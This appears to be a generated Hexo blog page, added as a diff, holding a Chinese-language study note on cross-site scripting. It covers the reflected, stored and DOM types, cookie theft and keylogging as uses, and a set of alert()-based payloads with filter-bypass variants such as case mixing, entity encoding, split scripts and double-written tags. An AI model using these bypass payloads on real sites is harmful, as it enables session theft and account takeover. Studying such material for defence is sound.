@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS漏洞漏洞的分类根据攻击手法的不同 ，XSS漏洞分为三类    类型 存储区 插入点    反射型XSS URL HTML   存储型XSS 后端数据库 HTML   DOM型XSS 后端数据库&#x2F;前端存储&#x2F;URL 前端JavaScript   反射型XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS漏洞漏洞的分类根据攻击手法的不同 ，XSS漏洞分为三类    类型 存储区 插入点    反射型XSS URL HTML   存储型XSS 后端数据库 HTML   DOM型XSS 后端数据库&#x2F;前端存储&#x2F;URL 前端JavaScript   反射型XSS">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-21T07:49:19.547Z">
+<meta property="article:modified_time" content="2022-04-21T07:51:34.032Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-XSS漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-04-21T07:49:19.547Z" itemprop="datePublished">2022-04-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="漏洞的分类"><a href="#漏洞的分类" class="headerlink" title="漏洞的分类"></a>漏洞的分类</h2><p>根据攻击手法的不同 ，XSS漏洞分为三类</p>
+<table>
+<thead>
+<tr>
+<th align="center">类型</th>
+<th align="center">存储区</th>
+<th align="center">插入点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">反射型XSS</td>
+<td align="center">URL</td>
+<td align="center">HTML</td>
+</tr>
+<tr>
+<td align="center">存储型XSS</td>
+<td align="center">后端数据库</td>
+<td align="center">HTML</td>
+</tr>
+<tr>
+<td align="center">DOM型XSS</td>
+<td align="center">后端数据库/前端存储/URL</td>
+<td align="center">前端JavaScript</td>
+</tr>
+</tbody></table>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><span id="more"></span>
+
+<p>验证反射型xss漏洞存在的poc :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; alert(/xss/)&lt;/script&gt; (常用)</span><br><span class="line">&lt;script&gt; confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt; prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>存储型XSS</p>
+<p>概念:持久性跨站脚本，是3三种XSS中危害最大的。它是将恶意代码写进数据库或文件等可以永久保存数据的介质中</p>
+<p>存在位置:常出现在留言板、发表评论或发表文章的地方(数据写入的地方)</p>
+<p>攻击手法:通过留言板等功能，将攻击者精心构造XSS代码，保存到数据库中,当其他用户再次访问这个页面时,就会触发并执行恶意的XSS代码,从而窃取用户的敏感信息。</p>
+<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>漏洞概念:不经过后端, DOM-XSS漏洞是基于文档对象模型的一种漏洞,简单去理解就是因为输出点在DOM。DOM-XSS是通过ur|传入参数去控制触发的,其实也属于反射型XSS。</p>
+<p>攻击手法:</p>
+<p>攻击者构造出特殊的URL ,其中包含恶意代码。用户打开带有恶意代码的URL</p>
+<p>用户浏览器接收到响应后解析执行,前端JavaScript取出URL中的恶意代码并执行。</p>
+<p>恶意代码窃取用户数据并发送到攻击者的网站,或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
+<p>常用的DOM方法:</p>
+<table>
+<thead>
+<tr>
+<th align="center">方法</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">getElementById()</td>
+<td align="center">返回带有指定ID的元素。</td>
+</tr>
+<tr>
+<td align="center">getElementsByTagName()</td>
+<td align="center">返回包含带有指定标签名称的所有元素的节点列表(集合/节点数组)。</td>
+</tr>
+<tr>
+<td align="center">getElementsByClassName()</td>
+<td align="center">返回包含带有指定类名的所有元素的节点列表。</td>
+</tr>
+<tr>
+<td align="center">appendChild()</td>
+<td align="center">把新的子节点添加到指定节点。</td>
+</tr>
+<tr>
+<td align="center">removeChild()</td>
+<td align="center">删除子节点。</td>
+</tr>
+<tr>
+<td align="center">replaceChild()</td>
+<td align="center">替换子节点。</td>
+</tr>
+<tr>
+<td align="center">insertBefore()</td>
+<td align="center">在指定的子节点前面插入新的子节点。</td>
+</tr>
+<tr>
+<td align="center">createAttribute()</td>
+<td align="center">创建属性节点。</td>
+</tr>
+<tr>
+<td align="center">createElement()</td>
+<td align="center">创建元素节点。</td>
+</tr>
+</tbody></table>
+<h3 id="三种漏洞的区别"><a href="#三种漏洞的区别" class="headerlink" title="三种漏洞的区别"></a>三种漏洞的区别</h3><p>存储型XSS与反射型XSS的区别</p>
+<p>存储型 XSS的恶意代码存在数据库里，反射型XSS的恶意代码存在URL里</p>
+<p>DOM型与其他两种XSS的区别</p>
+<p>DOM型XSS攻击中,取出和执行恶意代码由浏览器端完成,属于前端JavaScript自身的安全漏洞,而其他两种XSS都属于服务端的安全漏洞</p>
+<h2 id="XSS的简单利用有哪些"><a href="#XSS的简单利用有哪些" class="headerlink" title="XSS的简单利用有哪些"></a>XSS的简单利用有哪些</h2><p>1.XSS获取管理员权限(获取cookie) ——-重要</p>
+<p>2.XSS键盘记录 ——–重要</p>
+<p>3.XSS获取内网IP</p>
+<h3 id="XSS获取cookie"><a href="#XSS获取cookie" class="headerlink" title="XSS获取cookie"></a>XSS获取cookie</h3><p>➢cookie的介绍 :指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据</p>
+<p>➢cookie的作用 :它可以记录用户ID、密码、停留时间等等,当再次访问这个网站时,浏览器会自动监这个文件，并将存储在本地的Cookie信息发送给网站，网站通过读取Cookie ,得知相关信息,就可以做出相应的动作,比如:直接登陆,无需再次输入账号和密码。</p>
+<p>➢获取cookie的危害 :窃取用户Cookie ,冒充用户身份进入网站</p>
+<p>cookie的格式: Cookie有变量名( key )和值( value )组成,属性中的变量用”变量=值”的形式保存</p>
+<p>Set-Cookie: <name> = <value>[; <name> = <value>]…</p>
+<h2 id="XSS的绕过"><a href="#XSS的绕过" class="headerlink" title="XSS的绕过"></a>XSS的绕过</h2><h3 id="伪协议的方式构造XSS"><a href="#伪协议的方式构造XSS" class="headerlink" title="伪协议的方式构造XSS"></a>伪协议的方式构造XSS</h3><p>可以使用javascript: 伪协议的方式构造XSS , html标签支持js伪协议形式,如src , href , background等</p>
+<p>形式: javascriptalert(xss/);</p>
+<p>举例:利用href标签的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href= &quot;javascript:alert(/xss/)&quot; &gt;touch me!&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过href标签创建超链接 ,并通过伪协议进行xss攻击,所以点击了超链接就会进行弹窗操作。</p>
+<p>使用src属性的JavaScript伪协议 ,造成恶意代码注入,从而实现XSS攻击</p>
+<p>如: &lt;img src= *javascript:alert(‘xss’)”&gt; (这种方法在IE6下测试成功)</p>
+<h3 id="事件利用"><a href="#事件利用" class="headerlink" title="事件利用"></a>事件利用</h3><p>可以利用html中某些动作事件,绑定恶意脚本。这是一种比较经典的编程思想。在网页中会发生很多事件(比如鼠标移动, 键盘输入等) , JS可以对这些事件进行响应。所以我们可以通过事件触发JS函数,再触发XSS</p>
+<p>常见的事件类型</p>
+<table>
+<thead>
+<tr>
+<th align="center">windows事件</th>
+<th align="center">对windows对象触发的事件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Form事件</td>
+<td align="center">HTML表单内的动作触发事件</td>
+</tr>
+<tr>
+<td align="center">Keyboard事件</td>
+<td align="center">键盘按键</td>
+</tr>
+<tr>
+<td align="center">Mouse事件</td>
+<td align="center">由鼠标或类似用户动作触发的事件</td>
+</tr>
+<tr>
+<td align="center">Media事件</td>
+<td align="center">由多媒体触发的事件</td>
+</tr>
+</tbody></table>
+<h3 id="利用CSS触发XSS-过时"><a href="#利用CSS触发XSS-过时" class="headerlink" title="利用CSS触发XSS (过时)"></a>利用CSS触发XSS (过时)</h3><p>我们可以利用CSS (层叠样式脚本)触发XSS。但是这种方法比较古老,基本上不适合现在主流的浏览器,但是从学习的角度,我们需要了解这种类型的XSS。以下代码均在IE6下测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">行内样式</span><br><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;</span><br><span class="line">页内样式</span><br><span class="line">&lt;style&gt; Body&#123;background-image:url(javascript:alert(/xss/)&#125; &lt;/style&gt;</span><br><span class="line">外部样式</span><br><span class="line">&lt;link rel= &quot; stylesheet&quot; type=&quot;text/css&quot; href=&quot; ./xss.css &quot;&gt; &lt;div&gt; hello &lt;div&gt;</span><br><span class="line">外部xss.css文件内容如下:</span><br><span class="line">h1 &#123;color:red;&#125;</span><br><span class="line">div &#123;</span><br><span class="line">	background-</span><br><span class="line">image:url(javascript:alert(/xss/))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他标签以及手法"><a href="#其他标签以及手法" class="headerlink" title="其他标签以及手法"></a>其他标签以及手法</h3><p>随着前端语言的更新和发展,会有新的标签和事件出现,所以前端的安全是个讨论不完的问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload= &quot; alert(/xss/)&quot;&gt; svg是H5语言中的标签,配合事件可以触发XSS</span><br><span class="line">svg是H5语言中的标签,配合事件可以触发XSS</span><br><span class="line">&lt;input onfocus = alert(/xss/) autofocus&gt;</span><br><span class="line">onfocus事件是input标签中的新增事件 ,这个事件是当input输入框获取焦点时执行一段JS代码 ,从而触发XSS</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h2><p>我们可以构造的XSS代码进行各种变形,以绕过XSS过滤器的检测。变形方式主要有以下9种</p>
+<h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><p>可以将payload 进行大小写转化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原payload : &lt;img src=&#x27;#&#x27; onerror= &#x27;alert(/xss/)&#x27;&gt;</span><br><span class="line">转换&lt;Img sRc=&#x27;#&#x27; Onerror= &quot;alert(/xss/)&quot; /&gt;</span><br><span class="line">原payload : &lt;a href= &quot;javascript:alert(/xss/)&quot; &gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a hREf= &quot;javaScript:alert(/xss/)&quot;&gt;click me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h3><p>HTML语言中对引号的使用不敏感,但是过滤函数对引号很严格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</span><br><span class="line">&lt;img src=&#x27;#&#x27; onerror=&#x27;alert(/xss/)&#x27;/&gt;</span><br><span class="line">&lt;img src=# onerror=alert(/xss/) /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="左斜线-代替空格"><a href="#左斜线-代替空格" class="headerlink" title="左斜线 [/]代替空格"></a>左斜线 [/]代替空格</h3><p>可以利用左斜线代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原payload&lt;Img sRc=&#x27;#&#x27; Onerror=&quot;alert(/xss/)&quot; /&gt; </span><br><span class="line">&lt;Img/sRc=&#x27;#&#x27;/Onerror= &#x27;alert(/xss/)&#x27; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="回车的使用"><a href="#回车的使用" class="headerlink" title="回车的使用"></a>回车的使用</h3><p>可以在一 -些位置添加水平制表符和回车符,来绕过关键字检测</p>
+<p>注意: 一些函数不可以加回车,比如事件: onmoveover, onerror等 ,它们对于html语言是完整的单词</p>
+<h3 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h3><p>可以对标签属性值进行转码,用来绕过过滤。对应编码如下</p>
+<table>
+<thead>
+<tr>
+<th align="center">字母</th>
+<th align="center">ASCII码</th>
+<th align="center">十进制编码</th>
+<th align="center">十六进制编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">a</td>
+<td align="center">97</td>
+<td align="center">&#97;</td>
+<td align="center">&#x61;</td>
+</tr>
+<tr>
+<td align="center">e</td>
+<td align="center">101</td>
+<td align="center">&#101;</td>
+<td align="center">&#x65;</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">●原payload : &lt;a hREf= &quot;javaScript:alert(/xss/)&quot; &gt;click me&lt;/a&gt;</span><br><span class="line">&lt;A hREf=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot; &gt; click me! &lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>另外,可以将以下字符插入到任意位置</p>
+<table>
+<thead>
+<tr>
+<th align="center">Tab (水平制表符)</th>
+<th align="center">&amp;#9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">换行</td>
+<td align="center">&amp;#10</td>
+</tr>
+<tr>
+<td align="center">回车</td>
+<td align="center">&amp;#13</td>
+</tr>
+</tbody></table>
+<p>可以将一 下字符插入到头部位置( SOH、 STX为控制字符)</p>
+<table>
+<thead>
+<tr>
+<th align="center">SOH</th>
+<th align="center">&amp;#1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">STX</td>
+<td align="center">&amp;#2</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原payload : &lt;a hREf= &quot;javaScript:alert(/xss/)&quot; &gt; click me&lt;/a&gt;</span><br><span class="line">对标签属性值编码&lt;A hREf= &quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</span><br><span class="line">特殊字符编码&lt;A hREf=&quot;&amp;u#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;&gt;</span><br><span class="line">click me!</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h3><p>当应用程序没有过滤XSS关键字符(如&lt;、&gt; )却对输入字符长度有限制的情况下,如何使用”拆分法” 执行跨站脚本代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&#x27;alert&#x27; &lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+ &#x27;(/xss/)&#x27; &lt;/script&gt;</span><br><span class="line">&lt;script&gt; eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些网站只对敏感词汇进行一 次过滤,所以使用双写就可以绕过该过滤机制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原payload : &lt;script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSS中的变形-了解"><a href="#CSS中的变形-了解" class="headerlink" title="CSS中的变形 (了解)"></a>CSS中的变形 (了解)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用全角字符</span><br><span class="line">width:e x p r e s s i o n (alert(/xss/))</span><br><span class="line">注释会被浏览器忽略</span><br><span class="line">width:expr/*~*/ession(alert(/x~s-s/))</span><br><span class="line">样式表中的[\]和[\0]</span><br><span class="line">&lt;style&gt; @import &#x27;javasc\ri\0pt:alert(&quot;xss&quot;);&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/" data-id="cl28pebbc0000kku22mby8mc5" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/SQLMAP/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
